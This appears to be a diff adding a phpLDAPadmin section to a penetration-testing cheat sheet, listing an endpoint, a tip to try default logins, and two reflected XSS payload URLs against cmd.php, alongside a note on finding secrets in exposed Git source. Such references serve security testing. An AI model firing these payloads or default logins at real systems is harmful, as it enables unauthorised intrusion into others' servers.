@@ -3016,6 +3016,17 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 
 
+### <ins>phpLDAPadmin</ins>
+
+- Endpoint: `phpldapadmin/index.php`
+- Try default logins
+- XSS
+  - `cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1`
+  - `cmd.php?server_id=<script>alert('Orwa')</script>`
+- See [Godfather Orwa's tweet](https://twitter.com/GodfatherOrwa/status/1701392754251563477)
+
+
+
 ### <ins>Git source code exposure</ins>
 
 Once you have the source code, look for the secrets within the files. To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).
